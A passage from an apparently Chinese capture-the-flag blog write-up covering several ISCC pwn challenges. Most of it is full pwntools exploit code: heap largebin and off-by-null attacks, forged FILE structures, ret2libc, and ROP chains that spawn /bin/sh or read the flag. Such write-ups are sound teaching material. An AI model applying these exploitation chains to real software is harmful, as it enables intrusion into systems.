class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;context&#x27;</span>)</span><br><span class="line">    sh.send(Content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="built_in">id</span>),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 释放到 unsortedbin 用来 leak libc_base</span></span><br><span class="line">libc_add=u64(sh.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=libc_add-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">io_list_all=libcbase+<span class="number">0x1ed5a0</span></span><br><span class="line">log.info(<span class="string">&#x27;libcbase &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">log.info(<span class="string">&#x27;io_list_all &#x27;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack 打 io_list_all</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x430</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>-<span class="number">1</span>)+<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">heap_add=u64(sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;heap_add &#x27;</span>+<span class="built_in">hex</span>(heap_add))</span><br><span class="line"></span><br><span class="line">fd=libcbase+<span class="number">0x1ecfd0</span></span><br><span class="line">payload=p64(fd)*<span class="number">2</span>+p64(heap_add)+p64(io_list_all-<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发largebin attack</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x470</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪造IO_file打setcontext将栈迁移到堆</span></span><br><span class="line">openadd=libcbase+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">readadd=libcbase+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">writeadd=libcbase+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">setcontextadd=libcbase+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">rdi=libcbase+<span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi=libcbase+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx_r12=libcbase+<span class="number">0x0000000000119431</span></span><br><span class="line">ret=libcbase+<span class="number">0x0000000000022679</span></span><br><span class="line"></span><br><span class="line">chunk_small=heap_add+<span class="number">0x850</span></span><br><span class="line">IO_wfile_jumps=libcbase+<span class="number">0x1e8f60</span></span><br><span class="line">fakeIO_add=chunk_small</span><br><span class="line">orw_add=fakeIO_add+<span class="number">0x200</span></span><br><span class="line">A=fakeIO_add+<span class="number">0x40</span></span><br><span class="line">B=fakeIO_add+<span class="number">0xe8</span>+<span class="number">0x40</span>-<span class="number">0x68</span></span><br><span class="line">C=fakeIO_add</span><br><span class="line"></span><br><span class="line">fake_IO=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_IO=fake_IO.ljust(<span class="number">0x18</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO+=p64(<span class="number">1</span>) </span><br><span class="line">fake_IO=fake_IO.ljust(<span class="number">0x78</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO+=p64(fakeIO_add)</span><br><span class="line">fake_IO=fake_IO.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO+=p64(A)</span><br><span class="line">fake_IO=fake_IO.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO+=p64(IO_wfile_jumps)</span><br><span class="line">fake_IO+=p64(orw_add)+p64(ret)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span></span><br><span class="line">fake_IO+=p64(B)+p64(setcontextadd+<span class="number">61</span>)</span><br><span class="line"></span><br><span class="line">flag_add=orw_add+<span class="number">0x100</span>+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打堆上的orw</span></span><br><span class="line">orw = p64(rdi)+ p64(flag_add) + p64(rsi) + p64(<span class="number">0</span>)  + p64(openadd)</span><br><span class="line">orw += p64(rdi)+ p64(<span class="number">3</span>)+p64(rsi)+p64(flag_add)+p64(rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)+p64(readadd)</span><br><span class="line">orw += p64(rdi)+p64(<span class="number">1</span>)+p64(writeadd)</span><br><span class="line"></span><br><span class="line">payload=fake_IO</span><br><span class="line">payload=payload.ljust(<span class="number">0x200</span>-<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=orw</span><br><span class="line">payload=payload.ljust(<span class="number">0x300</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit 触发 io_list_all 的遍历执行</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;choice&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2024/05/17/isccwp/image-20240522135602410.png" alt="image-20240522135602410"></p><p>得到flag</p><h2 id="miao"><a href="#miao" class="headerlink" title="miao"></a>miao</h2><p>查看elf文件的一些基本信息，并拖入IDA反编译</p><p><img src="/2024/05/17/isccwp/image-20240522172630663.png" alt="image-20240522172630663"></p><p>发现两个简单漏洞</p><p><img src="/2024/05/17/isccwp/image-20240522173320582.png" alt="image-20240522173320582"></p><p><img src="/2024/05/17/isccwp/image-20240522173339996.png" alt="image-20240522173339996"></p><p>第一次leak canary，第二次打ret2sycall。</p><p><img src="/2024/05/17/isccwp/image-20240522180159260.png" alt="image-20240522180159260"></p><p>exp:</p><h2 id="your-program"><a href="#your-program" class="headerlink" title="your_program"></a>your_program</h2><p>查看一下保护，并拖入IDA反编译</p><p><img src="/2024/05/17/isccwp/image-20240522184531947.png" alt="image-20240522184531947"></p><p><img src="/2024/05/17/isccwp/image-20240522203101987.png" alt="image-20240522203101987"></p><p>没有任何保护，且此处有栈溢出，所以打ret2libc，需要注意的是，此前只有一个函数<code>printf</code>被调用，所以只有该函数能泄露got地址。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>) </span><br><span class="line">p = remote(<span class="string">&quot;182.92.237.102&quot;</span>,<span class="number">10032</span>) </span><br><span class="line">elf = ELF(<span class="string">&quot;./Your_program&quot;</span>) </span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc6_2.31-0ubuntu9.15_amd64.so&#x27;</span>) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(): </span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>(): </span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)) </span><br><span class="line"></span><br><span class="line">rdi= <span class="number">0x401763</span> </span><br><span class="line">puts = <span class="number">0x401100</span> </span><br><span class="line">authorize = <span class="number">0x401276</span> </span><br><span class="line">key=<span class="string">b&#x27;A&#x27;</span>*<span class="number">40</span>+p64(rdi)+p64(elf.got[<span class="string">&#x27;printf&#x27;</span>])+p64(puts)+p64(authorize) </span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter key:&quot;</span>,key) </span><br><span class="line">printf_add=get_addr() </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(printf_add)) </span><br><span class="line">libc_base=printf_add-libc.sym[<span class="string">&#x27;printf&#x27;</span>] </span><br><span class="line">system,<span class="built_in">bin</span>=get_sb() </span><br><span class="line">key=<span class="string">b&#x27;A&#x27;</span>*<span class="number">40</span>+p64(rdi+<span class="number">1</span>)+p64(rdi)+p64(<span class="built_in">bin</span>)+p64(system) </span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter key:&quot;</span>,key) </span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><h2 id="eazy-heap"><a href="#eazy-heap" class="headerlink" title="eazy_heap"></a>eazy_heap</h2><p>​保护全开，有沙盒禁用execve，拖入IDA反编译</p><p><img src="/2024/05/17/isccwp/image-20240522213508347.png" alt="image-20240522213508347"></p><p><img src="/2024/05/17/isccwp/image-20240522213910572.png" alt="image-20240522213910572.png"></p><p><img src="/2024/05/17/isccwp/image-20240522213539235-171723276882772.png" alt="image-20240522213539235"></p><p>​发现在edit中存在off by null </p><p><img src="/2024/05/17/isccwp/image-20240522223145451.png" alt="image-20240522223145451"></p><p>​利用large chunk泄露出来libc和heap,然后利用off_by_null进行unlink，构造块重叠。然后申请chunk到environ用来leak stack，之后同样的方法申请堆到栈上，劫持add函数返回地址，挟持程序流</p><p>最后打栈上的ORW，直接获得flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf =ELF(<span class="string">&quot;./CAT_DE&quot;</span>)</span><br><span class="line"><span class="comment">#sh = remote(&quot;182.92.237.102&quot;,2122)</span></span><br><span class="line">sh=process(<span class="string">&quot;./CAT_DE&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;input your car choice &gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;input your car choice &gt;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;input your car choice &gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;input your car choice &gt;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x440</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x440</span>,<span class="string">&quot;AAAAAAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x440</span>,<span class="string">&quot;BBBBBBBB&quot;</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">libc.address = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) -<span class="number">0x21a000</span> - <span class="number">0xe0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base-----&gt;&#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">envrion = libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">stdout = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">sh.recv(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x290</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0xf8</span>,<span class="string">&quot;AAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&quot;AAA&quot;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">&quot;AAA&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i+<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">target = heap_addr + <span class="number">0x17c0</span></span><br><span class="line">ptr = heap_addr + <span class="number">0xc60</span></span><br><span class="line">edit(<span class="number">0</span>,p64(target))</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(ptr-<span class="number">0x18</span>) + p64(ptr - <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">dele(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe8</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0xe8</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;\xf1&quot;</span>)</span><br><span class="line">sh.recv(<span class="number">7</span>)</span><br><span class="line">en_key = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;en_key ===&gt; &quot;</span> + <span class="built_in">hex</span>(en_key))</span><br><span class="line">key = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;key ===&gt; &quot;</span> + <span class="built_in">hex</span>(key))</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(en_key)+p64(key)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>,<span class="string">b&quot;\x00&quot;</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0xf1</span>) + p64((heap_addr+<span class="number">0x10</span>)^en_key)</span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe8</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">add(<span class="number">0xe8</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x0000000700010001</span>)+p64(<span class="number">0</span>)*<span class="number">24</span>+p64(envrion-<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stdout))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xd0</span>,<span class="string">&quot;A&quot;</span>*<span class="number">8</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">stack = u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x140</span> - <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x0000000700010001</span>)+p64(<span class="number">0</span>)*<span class="number">24</span>+p64(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span> + libc.address</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f497</span> + libc.address</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi) + p64(stack) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(stack + <span class="number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>) + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_addr)</span><br><span class="line">add(<span class="number">0xd0</span>,<span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)+orw)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="擂台"><a href="#擂台" class="headerlink" title="擂台"></a>擂台</h1><h2 id="curious"><a href="#curious" class="headerlink" title="curious"></a>curious</h2><p>查看保护，发现几乎没有，拖入IDA反编译，发现是静态编译的，且IDA无法识别。</p><p><img src="/2024/05/17/isccwp/image-20240521215458788.png" alt="image-20240521215458788"></p><p>索性直接跑一下，然后IDA查字符串</p><p><img src="/2024/05/17/isccwp/image-20240521215653319.png" alt="image-20240521215653319"></p><p><img src="/2024/05/17/isccwp/image-20240521215746893.png" alt="image-20240521215746893"></p><p><img src="/2024/05/17/isccwp/image-20240521215818141.png" alt="image-20240521215818141"></p><p>此处明白了大概逻辑，先输入六个字符，经加密后放到<code>byte_4c54e0</code>处，然后与字符串<code>&quot;B2GXEwvZ&quot;</code>比较，成功则进入下一阶段。这不就是加密嘛，直接看加密过程，发现有很明显的base64的特征。</p><p><img src="/2024/05/17/isccwp/image-20240521220404773.png" alt="image-20240521220404773"></p><p><img src="/2024/05/17/isccwp/image-20240521220541748.png" alt="image-20240521220541748"></p><p>测试一下，发现除了base64加密外还有大小写转换</p><p><img src="/2024/05/17/isccwp/image-20240521221210539.png" alt="image-20240521221210539"></p><p><img src="/2024/05/17/isccwp/image-20240521221316887.png" alt="image-20240521221316887"></p><p>直接手动转换一下大小写尝试解密</p><p><img src="/2024/05/17/isccwp/image-20240521221421231.png" alt="image-20240521221421231"></p><p><img src="/2024/05/17/isccwp/image-20240521221539417.png" alt="image-20240521221539417"></p><p>解密成功，进入下一步，看起来似乎有两次输入，第二次输入在栈上</p><p><img src="/2024/05/17/isccwp/image-20240521221643174.png" alt="image-20240521221643174"></p><p>直接ROPgadget一把梭</p><p><img src="/2024/05/17/isccwp/image-20240521224153861.png" alt="image-20240521224153861"></p><p>exoloit:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&quot;debug&quot;</span>,arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p += p64(<span class="number">0x000000000040f49e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004c20e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x0000000000452af7</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += p64(<span class="number">0x0000000000483b85</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x000000000040f49e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004c20e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x0000000000446ef9</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000483b85</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x0000000000401912</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004c20e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += p64(<span class="number">0x000000000040f49e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004c20e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x000000000040181f</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004c20e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += p64(<span class="number">0x0000000000446ef9</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += p64(<span class="number">0x00000000004788c0</span>) <span class="comment"># add rax, 1 